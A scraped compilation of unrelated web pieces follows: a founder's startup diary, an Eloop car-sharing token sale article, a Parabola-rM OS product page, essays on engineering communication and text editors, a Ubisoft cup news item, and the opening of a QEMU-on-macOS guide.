<p><span>She was looking to quickly scale her marketing team with quality candidates.</span></p>
<p><span>“This is exactly the kind of product I need right now”.</span></p>
<p><span>Then. The unbelievable happened.</span></p>
<p><span>“So, we’re obviously happy to pay you for the work you do with this. How much is it going to cost”.</span></p>
<p><span>I freeze.</span></p>
<p><span>I genuinely didn’t expect the call to veer this way.</span></p>
<p><span>I respond.</span></p>
<p><span>“Well. Umm. It’s free for any brands that join before launch, but later we can talk about paying for access to additional features I have in my backlog”.</span></p>
<p><span>WHAT. THE. FUCK.</span></p>
<p><span>I couldn’t explain how disappointed I was in myself. At the same time, I was at an all-time high.</span></p>
<p><span>I finally had early signs of validation.</span></p>
<p><span>This feeling only lasted a short week.&nbsp;</span></p>
<p><span>COVID came.</span></p>
<p><span>It didn’t spare anyone in the recruitment industry.</span></p>
<p><span>I was so close, but the timing couldn’t have been worse.</span></p>
<p><span>I knew this wasn’t going away for a long time.</span></p>


<hr>


<p><span><b>April 2020</b></span></p>
<p><span>Throughout isolation, I needed a project to keep me sane.</span></p>
<p><span>I decided to break my own rule and start building my product.</span></p>
<p><span>I knew this wasn’t a good use of my time, but what else was I going to do during COVID?</span></p>
<p><span><span>I build the</span> </span><a href="https://clickthrough.marketing/" target="_blank" rel="noopener"><span>site</span></a><span> in WordPress, then started working on SEO tasks. I was determined to use this downtime during COVID to build an organic growth machine.</span></p>
<p><span>I started building backlinks and publishing content. It’d been years since I had the chance to work on any SEO projects, so I used this time to up-skill my practical knowledge as a digital marketer.</span></p>
<p><span>In the space of four months, I managed to generate 142 high-quality backlinks, tripling my sites domain ranking.</span></p>

<p><span>As any SEO knows, building backlinks was an absolute slog.</span></p>
<p><span>This whole process involved writing original 2,000 – 3,000 word guest articles for some of the industries biggest publishers.</span></p>
<p><span>At the same time, I needed to also publish high-quality content to my own site to start ranking for keywords that would generate traffic.</span></p>
<p><span>Every second week, I’d publish a 5,000 article to my own site. You can check these out </span><a href="https://clickthrough.marketing/most-in-demand-marketing-skills-2020/" target="_blank" rel="noopener"><span>here</span></a> <span>and </span><a href="https://clickthrough.marketing/top-product-marketing-manager-interview-questions/" target="_blank" rel="noopener"><span>here</span></a><span>.</span></p>
<p><span>Surely enough, I started to burn out.</span></p>
<p><span>As someone that doesn’t enjoy writing, the thought of having to create another article started to make me feel sick.</span></p>
<p><span>I needed something else to temporarily work on.</span></p>


<hr>


<p><span><b>August 2020</b></span></p>
<p><span>I decided to take a day off and clean my house. I started clearing my wardrobe of the clothes I no longer wore.</span></p>
<p><span>It’d been years since I’d bought new clothes, so my wardrobe didn’t cater to my recent taste or personality.</span></p>
<p><span>As an overly passionate maker, I wanted to start wearing startup shirts throughout my everyday life.</span></p>
<p><span>The only problem, however, is that startups shirts are notoriously hideous and bold.</span></p>


<div><figure><img data-attachment-id="3100" data-permalink="https://lachlankirkwood.com/2020/08/27/product-maker-journey/startup-shirts/" data-orig-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png" data-orig-size="1200,628" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Startup-Shirts" data-image-description="" data-medium-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=300" data-large-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=748" src="https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=1024" alt="Startup teeshirts" srcset="https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=1024 1024w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=150 150w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=300 300w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png?w=768 768w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/startup-shirts.png 1200w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>


<p><span>There it was. A new problem.</span></p>
<p><span>My solution…</span></p>
<p><span>Why don’t I just make my own?</span></p>
<p><span>I wanted to create a minimalist series of shirts that I could wear to any occasion. Whether I’m working at home, going out to dinner, or meeting with friends, these shirts needed to be discrete enough to match the rest of my wardrobe.</span></p>


<div><figure><img data-attachment-id="3122" data-permalink="https://lachlankirkwood.com/2020/08/27/product-maker-journey/ship-it-shirt/" data-orig-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png" data-orig-size="1920,1280" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Ship-It-Shirt" data-image-description="" data-medium-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png?w=300" data-large-file="https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png?w=748" src="https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png?w=1024" alt="Maker Threads startup shirt" srcset="https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png?w=1024 1024w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png?w=150 150w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png?w=300 300w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png?w=768 768w, https://lachlankirkwoodblog.files.wordpress.com/2020/08/ship-it-shirt.png 1920w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>


<p><span>I jump online and print three of my own custom shirts. It costs me $75.</span></p>
<p><span>Then it hit me. I wonder if other makers like myself who experience this same problem.</span></p>
<p><span>I sent a photo to my friend who’s a software engineer, then tell him my idea.</span></p>
<p><span>His response.</span></p>

<p><span>It’s time to get to work, but this time I planned to be scrupulous about the process.</span></p>
<p><span>My goal was to spend a day validating this idea, then determine if it was something I should pursue.</span></p>
<p><span>If I couldn’t validate the concept, I’d return to posting blog content.</span></p>
<p><span>I spent a few hours creating some shirt designs in Canva.</span></p>
<p><span>Next, I was I’m ready to build my own online store.</span></p>
<p><span>I had to stop myself there.</span></p>
<p><span>If I’m building a Shopify store, I’ll need to buy a domain, design the store itself, then pay for a Shopify subscription.</span></p>
<p><span>This would consume too much time and money. After all, I’m only seeking validation.</span></p>
<p><span>I head to Teespring. I upload my designs to their print-on-demand store and use their default storefront.</span></p>
<p><span>I give it a basic name (Maker Threads) and spend two minutes designing a logo,</span></p>
<p><span>At this point, the store doesn’t look like anything special. I didn’t even have my own custom domain.</span></p>

<p><span>If users truly saw the value in my product, I should be able to sell just one shirt to validate the idea.</span></p>
<p><span>As a digital marketer, the old me would have happily thrown $100 behind some Facebook ads to acquire these customers. This time, I wasn’t going to let myself spend a dollar.</span></p>
<p><span>On a Sunday night (AEST), I launch the store on Product Hunt and with zero expectations.</span></p>
<p><span>Like most small makers, every Product Hunt launch I’ve shared in the past has amassed to no traction.</span></p>
<p><span>This time was different.</span></p>

								<div>
					<p>One year ago, the Austrian startup <a href="https://eloop.at/">Eloop</a> started its sharing service for e-cars in Vienna – and was already communicating back then: The intention was to enable users to invest in the e-vehicle fleet via blockchain and cryptocurrencies and to give them a share of the revenue. Now the time has come: At a token sale starting today, interested parties can buy the new <a href="https://eloop.one/">Eloop One Token</a> (EOT).</p>
<p>Anyone who owns tokens will be able to participate in the startup’s revenues. „The term ‚car sharing‘ currently stands for app-based car rentals. We want to translate the meaning of sharing implied in the term into reality by sharing not only our e-cars with citizens, but also the revenues,“ says Leroy Hofer, one of Eloop’s co-founders and CEO. „Anyone who has one of these tokens is making money from car-sharing rides.“ The revenue share can either be paid out in Euros or converted into credits for the car sharing service.</p>
<h2>„Asset Backed Token“</h2>
<p>The tokens, which by the way are not based on Ethereum like many others, but on the 0bsnetwork, were designed as security tokens, i.e. a digitalized version of a security. „This protocol was used for various reasons. Some of the most important reasons were the low network fees, the network speed and proof of stack. Low fees and high speed are essential for efficient implementation, since a large number of micro-transactions are involved. The protocol also allows smart tokens and smart accounts,“ Hofer says.</p>
<p>More precisely, EOTs are so-called „asset-backed tokens“; in total, there are initially exactly 240,000 EOTs. „The value corresponds to four BMW i3s that are already in our car-sharing fleet at Eloop,“ says Hofer. „These cars were tokenized, i.e. they are displayed on the blockchain using EOT. Depending on user demand, more cars will be tokenised gradually, which will also increase the token supply. As a buyer of a token (exactly one Euro per token is required) you get a fraction of a car. If the car generates revenue via car sharing, this is distributed proportionally to the owners of the tokens.</p>
<h2>Tokenization of Assets</h2>
<p>The tokenization of a wide variety of assets is a trend that has been spreading recently. For example, in Security Token Offerings (STOs), the shares of companies are represented in tokens. In Austria, <a href="https://www.trendingtopics.at/blockpit-sto-2-5-millionen-euro/">Blockpit</a> and <a href="https://www.trendingtopics.at/bluepower-security-token-offering-wind-energy/">Blue Power</a>, for example, have carried out STOs in order to raise money from investors – in return, tokens were issued. <a href="https://www.trendingtopics.at/black-manta-capital-security-tokens-statt-aktien-mit-segen-der-finanzaufsicht/">Black Manta Capital</a>, in turn, has received the blessing of the financial supervisory authorities in Germany to enable small investors to invest in luxury apartments in Berlin via tokens . The Eloop tokens are also classified as Security Token – the young company was advised by the law firm DLA Piper.</p>
<p>At Eloop, the shares in an electric car are now displayed as tokens. In a first step, 240,000 EOTs will be sold at one euro each, bringing in 240,000 euros. When new electric cars are added to the fleet, more tokens can be created to bring the new vehicles onto the blockchain. The current token sale runs until end of December or until all tokens have been sold. Later, the EOTs should also be able to be traded on crypto exchanges. They will then be subject to pricing on the crypto-market – and their value may rise as well as fall. This is another thing you should keep in mind when you want to invest.</p>

<p>Parabola-rM (PRM) turns a reMarkable e-paper tablet into a laptop. It is a <a href="https://www.fsf.org/about/what-is-free-software">free</a> operating system that replaces the manufacturer's proprietary OS. With it, one may author code, write documents, edit spreadsheets, and do everything that one may do with an ordinary graphical operating system.</p>

<p>All reMarkable hardware works except for the Wi-Fi radio because it requires proprietary firmware. The electrophoretic display supports fast partial refreshing. The EMR digitizer and touchscreen work. The facial buttons work. The power button turns the device on and off, and the power mode can be suspended and come back. External peripherals are supported with USB OTG. Heck, there is even a battery monitor in the desktop's status bar.</p>

<h2>Parabola on reMarkable: A Guide</h2>
<p>The <a href="http://www.davisr.me/projects/parabola-rm/install-guide-latest.pdf">extended installation manual</a> is available at no charge and covers how to install Parabola GNU/Linux-libre from-scratch. It is recommended to read this, and be comfortable with the process outlined, before purchasing the OS images.</p>


<h2>Download the distribution images</h2>
<p>PRM may be purchased for $20 (USD). Half of the proceeds will be split between the <a href="https://www.fsf.org/">Free Software Foundation</a> and the <a href="https://www.parabola.nu/">Parabola Project</a>. With purchase, a customer will receive a <code>.tar</code> archive of the following, and 6 months of PRM OS updates.</p>
<ul>
	<li>Compiled Parabola-rM OS image, plus bootloader image suitable for immediate transfer</li>
	<li>Compiled versions of <em>imx_usb</em> for FreeBSD, GNU/Linux, and Windows (64-bit)</li>
    <li>Installation manual as PDF, HTML, and LaTeX</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Software engineers will spend years looking at code, without thinking about their communication skills. However, software engineering is more than just programming. The reality is that technical ability can only take someone so far. Once you hit the technical ceiling, it becomes about communication.</p><p>In this post, I'm going to talk about communication and why it's important. I'll share with you the three domains of communication and decision-making. These domains will give you the tools to take your problem-solving skills and apply them to matters of communication.</p><h2></h2><p>Of course! An engineer can only get so far with technical ability alone. When we look at a job description from Google for a Software Engineer, we see the following:</p><ol><li><b>Degree or equivalent practical experience in computer science.</b></li><li><b>Experience in working with the programming languages and frameworks we use.</b></li><li><b>Working proficiency and communication skills.</b></li></ol><p>These are the minimum skills required to become a software engineer. Technical ability is the basis for early career development. If you want to continue growing, you need to break past the technical ceiling. Let's look at the added requirements for a Staff Software Engineer position:</p><ol><li><b>Experience architecting and developing distributed systems design.</b></li><li><b>Hands on technical leadership experience leading project teams and setting technical direction.</b></li></ol><p>From these postings, we can see that technical ability can only get you halfway there. Communication skills are required for basic tasks like code reviews and collaboration. These are just the minimum skills required.</p><p>Beyond entry-level tasks, higher-level tasks require more strategic and tactical communication. Architecture requires strategizing a systems design through research, implementation, and working with others to oversee the process. Technical leadership requires essential communication skills to be able to direct and influence the group. Without developing these skills, an engineer can only go so far.</p><p>That's why we need communication: to grow. We need communication to take our technical abilities to new heights. These essential skills increase our ability to work with others and broaden our impact. To build these skills, we need to be more thoughtful, and we need to know which domains to think over.</p><h2></h2><p>Thoughtfulness and decisionmaking for software engineers can be broken down into three domains:</p><ol><li><b>Technical</b></li><li><b>Organizational</b></li><li><b>Operational</b></li></ol><p>Engineers are already familiar with the technical domain. Many find their ceilings here because it's easy to be distracted by matters of code. However,  to break past that ceiling, an engineer needs to exercise critical thinking in all three domains. </p><div data-id="4YFSBdUgLZsmte7jkBJX2P"><picture loading="lazy"><source srcset="https://images.ctfassets.net/f1aa79r6xovt/4YFSBdUgLZsmte7jkBJX2P/8b1416fb8ed5229c767558dcbb56e049/joshua-aragon-EaB4Ml7C7fE-unsplash.jpg?fm=webp&amp;w=700" type="image/webp"><img src="https://images.ctfassets.net/f1aa79r6xovt/4YFSBdUgLZsmte7jkBJX2P/8b1416fb8ed5229c767558dcbb56e049/joshua-aragon-EaB4Ml7C7fE-unsplash.jpg?fm=jpg&amp;w=700" alt="A laptop with a code editor open."></picture></div><h3></h3><p>Writing code is easy, but figuring out which code to write is not. For any given feature, we could write it a hundred different ways. And while there is no "right" way to write it, we can strive towards <a href="https://cole.codes/posts/hard-to-read-coding-with-communication">writing code that is easier to read and maintain</a>. Every line is a choice that makes tradeoffs to strive towards a healthier codebase.</p><p><em>So what makes a healthy codebase?</em></p><p><b>A healthy codebase has a good balance of the following:</b></p><ul><li>Clarity</li><li>Direction</li><li>Consistency</li></ul><p>A healthy codebase has <b>clarity</b>, where new changes are easy to implement against a known path. Implementing new routes, creating new interfaces, and deploying new APIs; tasks like these are straightforward. Struggles in clarity happen when a codebase has too many layers of redirection, multiple mechanisms for the same task, or insufficient tooling and documentation. These together can help make the codebase more accessible to all contributors.</p><p>A healthy codebase has a path forward, called <b>direction. </b>When considering <i>tech debt, </i>the deferred cost of a short-term solution, a healthy codebase is well-documented and guarded by tooling that helps the developer to be productive. A good sense of direction is when tech debt is easy to silo so that it does not impact the rest of the codebase. </p><p>Lastly, a healthy codebase has <b>consistency</b> in its use of patterns. This means that what happens in one place of the codebase, is expected to happen elsewhere. Consistency is a spectrum where patterns align together. When there are many contributors over time, multiple patterns can emerge. Inconsistencies can also emerge when introducing new tooling or patterns. On the other hand, these are only problems when there is a lack of clarity or direction in the codebase.</p><p>A healthy codebase has a healthy balance of all three devices: clarity, direction, and consistency. When talking through the technical domain, these devices are useful tools for expressing the impact of technical decisions. However, engineers also need to think beyond the codebase. After all, the choices we make have an impact on the whole team.</p><div data-id="lcPTM12lFZQXYNUAZn1NZ"><picture loading="lazy"><source srcset="https://images.ctfassets.net/f1aa79r6xovt/lcPTM12lFZQXYNUAZn1NZ/defb2f91a9d53e9c4fb5d36811344187/kate-sade-2zZp12ChxhU-unsplash.jpg?fm=webp&amp;w=700" type="image/webp"><img src="https://images.ctfassets.net/f1aa79r6xovt/lcPTM12lFZQXYNUAZn1NZ/defb2f91a9d53e9c4fb5d36811344187/kate-sade-2zZp12ChxhU-unsplash.jpg?fm=jpg&amp;w=700" alt="An empty office with a dozen office chairs lined in cubicles."></picture></div><h3></h3><p>An <i>organization</i> is a group of people or a company. In engineering, an organization could mean multiple groups of people: the whole company, a specific team, or a group of code owners. The decisions that engineers make affect more than the codebase — they affect these groups of people too. Being thoughtful about the organization is helpful for making better decisions to benefit these groups.</p><p>The <b>organizational domain </b>is where thoughtfulness and decisionmaking can impact these groups. An engineer exercises this domain when starting inward and reflecting outward on how decisions impact their peers and collaborators. Consider a codebase as a product of its own. Reflect on the users of this product, contributors to the code.</p><p><b>To reflect in this domain, we can ask the following questions:</b></p><ul><li>Who will maintain this decision in the short-term?</li><li>How will this decision be adopted by external contributors?</li><li>What impact does this decision have to make future decisions?</li><li>When is the right time to make this decision?</li></ul><p>The final question to ask, considering the inputs above, is: <i>why?</i> When we ask why we're considering the tradeoffs being made in the organizational domain. Finally, when we ask this question we also need to ask the inverse: <i>why not?</i> </p><p>Thinking through these problems is how engineers elevate their problem-solving skills to the organization. Reflecting on how decisions impact these groups of people, is how engineers become more effective. The organizational domain is how engineers apply their problem-solving skills to the needs of the group. This takes us into our next domain, where we apply problem-solving skills to operations.</p><div data-id="2yt7UuYW8BY4BKinRLFJHC"><picture loading="lazy"><source srcset="https://images.ctfassets.net/f1aa79r6xovt/2yt7UuYW8BY4BKinRLFJHC/8773164bc37388265d1496efd05e4ecd/isaac-smith-6EnTPvPPL6I-unsplash.jpg?fm=webp&amp;w=700" type="image/webp"><img src="https://images.ctfassets.net/f1aa79r6xovt/2yt7UuYW8BY4BKinRLFJHC/8773164bc37388265d1496efd05e4ecd/isaac-smith-6EnTPvPPL6I-unsplash.jpg?fm=jpg&amp;w=700" alt="A chart demonstrating growth."></picture></div><h3></h3><p>The final domain we will cover is <b>the operational domain</b>. This domain is where problem-solving skills are applied to the impact on <i>processes</i>. The previous domains (technical and organizational) have so far focused on <i>things</i> and <i>people</i>. In this domain, we focus on the impact on things and people over time.</p><p>When working in product development, we often talk about <a href="https://cole.codes/posts/the-minimum-viable-product-mvp">how to build a minimum viable product.</a> The first process is the one in which we brainstorm and plan before building. In this process, we talk about the <i>scope </i>of the development, meaning what's included. In this process, it's also helpful to ask: what's not included? Through this process, engineers collect a list of <i>requirements</i>, the needs of the development to fulfill the scope. Together, scope and requirements are useful tools for talking about the development process.</p><p>What about the processes that happen after the code is written? Writing the code is easy, however, <b>engineers should be mindful of the following technical process that happen afterward:</b></p><ul><li>Code Review</li><li>Building and Deployment</li><li>Integration into the Mainline</li></ul><p>In addition to these processes, our thoughtfulness and decisions can have latent effects that impact how we implement and integrate in the future. <b>Moreover, there can be effects on the organizational and operational processes, such as:</b></p><ul><li>Who needs to be involved in the decision-making process? </li><li>How does the scope today affect the requirements for tomorrow?</li><li>What requirements can better prepare any incremental efforts?</li><li>Are there opportunities to generalize the approach to scale for other initiatives?</li><li>After the decision is settled, who needs to be informed?</li></ul><p><b>Questions like these are effective tools for communication and reflection. </b>When communicating in product development, asking these questions can help make an engineer more effective in the process. Reflecting on these answers will also make you a more critical thinker that can influence others at the table.</p><h3></h3><p>This framework of thinking is effective for software engineers to become more thoughtful and productive. Being thoughtful about the technical, organizational, and operational domains — will give you the tools to level up as a developer. Effective engineering is not writing the perfect code, but rather identifying how to apply problem-solving skills throughout the entire process. Harnessing communication in your career will help you become more impactful and influential beyond technical ability. The T.O.O framework reconciles these two areas to help you think through the domains and harness communication as a skill.</p><p>Photos by <a rel="nofollow noreferrer" target="_blank" href="https://unsplash.com/@goshua13">Joshua Aragon</a>, <a rel="nofollow noreferrer" target="_blank" href="https://unsplash.com/@kate_sade">Kate Sade</a> and <a rel="nofollow noreferrer" target="_blank" href="https://unsplash.com/@isaacmsmith">Isaac Smith</a>.</p></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Every so often my programming productivity takes a steep dive as I try to use a new text editor. </p>
<p>Why do I put myself through this? Simply put, I'm a bit of an efficiency fanatic. Fanatic in the sense of pursuing some end with not-entirely-rational vigor and passion. I call it fanatical because the pursuit of ever more efficiency in and of itself takes quite a bit of time, thus actively working against my ostensible goal of being more productive.</p>
<p>Whatever, it's a hobby.</p>

<p>Let's make a timeline. </p>
<h2><code>2011</code> Dreamweaver</h2>
<p>Oh yeah, I started there. This was when I first started learning web development and thought to myself "It's just text and images, how much harder than Word could it be?"</p>
<p>I'm not putting Dreamweaver down—it was actually a very good start. There were professional video tutorials about it since it was part of the Adobe suite. It even had code mode, which is just like any normal text editor.</p>
<p>However, it was not to last. Even with code mode I felt like I wasn't a <span>programmer</span>, whatever that meant. I felt like I needed more of a hacker-ish interface on which to work my magic. </p>
<h2><code>2011</code> Coda</h2>
<p>Yes, same year as Dreamweaver. After a bit of Dreamweaver I discovered Coda, a pretty nifty text editor that's <a href="https://www.panic.com/coda/">still around</a> (as of 2020-08-20). Why do I say that as if it's a big deal? Well, I'd be surprised if anyone who started programming after 2013 knows about it. This is not to say anything bad about the product, I just never met a single other programmer who had used it.</p>
<p>The cool feature that drew me in to Coda was that it could know about your websites. As far as I remember it was pitched as a great editor for creating front-end sites (JS, CSS, HTML). Back then my move was to write some code, open an FTP app and then drag/drop the files into it. Coda handled this nicely and saved me time. </p>
<h2><code>2013</code> Sublime Text</h2>
<p>Then, the programming world collectively gasps as Sublime Text 2 sweeps over the industry (* I doubt the Vim/Emacs people cared much, but as  you can see I was not yet among their numbers).</p>
<p>Sublime Text was just <span>awesome</span>. It was <span>fast</span>. It was minimal yet powerful which appealed to the power user in me. It was <span>not</span> intuitive, it was <span>not</span> discoverable, it was configured via JSON! It was exactly what I wanted.</p>
<p>For two whole years Sublime Was my primary editor and it was great. Along the way it taught me the power of dedicated tools, rather than an integrated suite. I used different apps for my terminal, my FTP client and my editor. </p>
<p>Of course my time with Sublime and the productivity it won me made me want more, and thus paved the way towards the black hole of text editors, the editor form which—once you have learned it—you will never fully detach yourself.</p>
<h2><code>2015</code> Vim</h2>
<p>In 2015 it finally clicked. This was something of a watershed moment in my text editing career. After years of false starts Vim finally took hold of my fingertips and things have never been the same since.</p>
<p>For anyone unaware, Vim is an ancient text editor from the 70s¹ that might already be installed on your computer. It's claim to fame is that it let's you edit <span>any text</span> with only the keyboard. No mouse interaction whatsoever. </p>
<p>Vim is hard to learn. Significantly harder than learning touch-typing. Anyone who already knows how to program but does't know Vim could probably pick it up in a month. However, it took me years. This was probably due to the fact that even I have my limits when it comes to "productivity hacking" and Vim will really, <span>really</span> decrease your productivity for a time. So I never used it much, just gave it another try here and there and eventually it stuck.</p>
<h3>Is it worth it? </h3>
<p>Yes, but it's not for everyone. </p>
<p>If you write a lot of code, or even just prose, using Vim is nothing short of magical. It feels like being in the future already, when computers simply do what we think. </p>
<p>A mouse is an imprecise device. Analog motion (i.e. your hand sliding a mouse across a desk) is relatively intuitive, but it's slow compared to directly telling the computer what you want. Anyone who's used software professionally for long enough understands this. Designers, architects, authors, anyone who uses a computer as a creative tool and uses it <span>a lot</span> eventually feels the strain of repetitive interactions. That's why professional software packages have numerous hotkeys. Even your operating system has numerous hotkeys, even if you don't know them or use them much.</p>
<p>When you're using Vim, everything is a hotkey. Every action you take you take with keys, which offers a great deal of precision and speed when it comes to editing text. </p>
<p>A quick example. Let's say you want to select all the text "here, within these quotes." What do you do? Normally, you just drag the mouse over all the text within the quotes and start typing. No problem! Now consider you have to do this many times a day, perhaps hundreds of times a day, with different text. Sometimes the text wraps around the screen, causing you to have to move your mouse further. Sometimes you accidentally drag too far or not far enough, causing you to have to hit undo and try again. This may all sound minor, but again, consider having to do it hundreds of times a day.</p>
<p>Now, if you're a Vim user you just type <code>ci"</code>. Three characters. The mnemonic for this sequence is "change inner <code>"</code>." The interesting thing is you can use that same <code>ci</code> "change inner ..." command with other characters. For instance <code>ci'</code> will let you change all the text inside single quotes. <code>ci(</code> will let you change all the text inside parens, and so on. It's quite a flexible and highly productive system (once you learn it).</p>
<h2><code>2016</code> Vim + Atom</h2>
<p>Enter Atom. I actually don't have a lot to say about Atom. I used it as my secondary editor since, again, once you've internalized Vim you never go back. However, Vim has a significant drawback: You have to program it to make it play nicely with new languages. That's right, you have to write code just to get your editor to let you write more code in an appealing way.</p>
<p>This is where Atom came in. It's a mainstream text editor in the sense that it has lots of features built-in and it will do its best to help you along the way. It also has a plugin repository where you can search for new plugins that do things like support new programming languages. It even has—and this is key—a plugin to emulate Vim!</p>
<p>So I ended up using Atom whenever I had to work with code that I hadn't yet configured Vim for. It worked out of the box, it was intuitive and it sort of supported Vim-like editing. </p>
<p>Perhaps most importantly, at this point my company had hired other developers and as the senior member of the team I needed to be able to recommend a way to edit our codebase—that recommendation was Atom.</p>
<h2><code>2018</code> Vim + VSCode</h2>
<p>So after a couple of years I decided to revisit VSCode. I honestly don't know why, but it became hugely popular and so it came across my radar again. It's a great text editor, but in my view it fills the space that Atom was in so I'm not sure why anyone switched 🤷‍♂️.</p>
<p>Regardless, I tried it out and thought "this is ok." The thing was, at this point I was a much more experienced programmer and <span>really didn't want</span> to spend time not directly solving whatever problem I was working on. I had little patience for configuring text editors, so whenever I tried a new language I would just open up VSCode instead of Vim since it would either immediately work well or have a plugin I could install.</p>
<p>VSCode still filled the space of secondary text editor until one day I discovered <a href="https://github.com/asvetliakov/vscode-neovim">a plugin for VSCode that embeds Vim</a>... 🤯 </p>
<p>Thus the balance switched. Now I use VSCode (in Vim mode) as my primary text editor and Vim as the secondary.</p>
<h2><code>2020</code> Vim + VSCode + Emacs</h2>
<p>And finally we're caught up. 2020 and I'm trying a new text editor. Why? Blame Clojure. Emacs and Lisp languages go very well together so I decided to try out Emacs, and it's pretty neat.</p>
<p>For anyone who doesn't know, Emacs is as old as Vim and has a similar keyboard-centric philosophy. It's also <span>even more</span> customizable than Vim, which is saying quite a lot. However, Emacs is unfortunately famous for forcing your hands into contortions to use various functions. </p>
<p>I only recently started using Emacs, so I can't actually speak to it's long-term utility but it's definitely interesting. Aside from being a lisp-based editor, which highly appeals to me, it also seems to <span>fully</span> support Vim. It emulates Vim but it does it so well that as far as I can tell you get the best of both worlds.</p>

<p>Since I haven't exactly come to any specific point, it's fortunate I didn't start writing this intending to make one. If there was one it would simply be: Pursue your hobbies. </p>
<p>Believe it or not fiddling with text editors brings me joy, so despite the occasional dips in productivity I continue to tinker. Besides, there's always the off chance that I'll become more productive. </p>

<p>This post was discussed on Hacker News: <a href="https://news.ycombinator.com/item?id=24290128">https://news.ycombinator.com/item?id=24290128</a></p>

<p><a href="#footnate">¹</a> Vim has become something of a catchall term for Vi and Vim, which are separate editors. Vi was first and Vim didn't show up until the 90s. </p></div></div>]]>

<p>As shown in the pictures, the cup has a rampant bug.&nbsp;Its handle appears on the inside of the cup.</p>



<p>According to a “letter of apology” posted by Sheepedia on <a rel="noreferrer noopener" href="https://weibo.com/7411688348/JhPdHCqvz" target="_blank">Weibo</a>, they received a notice from the factory at the beginning of this month.&nbsp;The factory says the quality of the cup is very good, but there seems to be something wrong with the mold.&nbsp;After receiving the notification, Sheepedia carried out two weeks of DEBUG work, but failed to make it correct.</p>



<p>In the letter, Sheepedia said that as the product is no longer suitable for use as a water cup, they will no longer sell the product and will present it as a collection to Ubisoft fans in the near future.&nbsp;Ubisoft (China) officials forwarded the letter of apology on Weibo and confirmed the incident.</p>

<p>The whole thing didn’t seem like a real accident, but a viral marketing.</p>



<p>The Weibo post got more than 8000 retweets views in just one hour.( Update after 6 hours: 25000 retweets)&nbsp;Many Chinese Ubisoft fans think that this is really worth buying Ubisoft souvenirs, and have asked Sheepedia to mass produce and sell this cup.</p>



<p>Here are some of the goods really sold at this event:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>August 26, 2020<span> · <a href="https://www.naut.ca/blog/tag/linux/">linux</a> <a href="https://www.naut.ca/blog/tag/macos/">macos</a> <a href="https://www.naut.ca/blog/tag/software/">software</a></span></p></div><div><p><img src="https://www.naut.ca/blog/content/images/2020/08/Screen-Shot-2020-08-26-at-8.31.40-PM.jpg" alt="Screen-Shot-2020-08-26-at-8.31.40-PM"></p>
<p>I first learned about <code>libvirt</code> and <code>QEMU</code> three years ago when I wrote a guide on <a href="https://github.com/yoonsikp/macOS-KVM-PCI-Passthrough">how to virtualize macOS on a Linux system</a>. Today I will be showing the opposite, virtualizing Linux on macOS using the same tools. I was surprised that with so many software developers using MacBooks everyday, nobody has created a guide on how to use <code>libvirt</code> and <code>QEMU</code> with macOS.</p>
<p>Why is <code>libvirt</code> and <code>QEMU</code> better? First of all, it's free and open-source. Unlike Parallels Desktop and VMWare Fusion, you won't need to pay for expensive subscriptions or manage licenses. There does exist an open-source alternative (from Oracle!) called VirtualBox, which works pretty well. However, VirtualBox does not support macOS's <a href="https://developer.apple.com/documentation/hypervisor">Hypervisor.Framework</a>, a virtualization API created to limit kernel modification. This means the installer will ask for admin access to install kernel extensions, a feature Apple is now <a href="https://www.zdnet.com/article/apple-deprecating-macos-kernel-extensions-kexts-is-a-great-win-for-security/">phasing out</a> for security reasons. <code>QEMU</code> on the other hand has had support for Hypervisor.Framework since 2018. Just say no to kexts!</p>
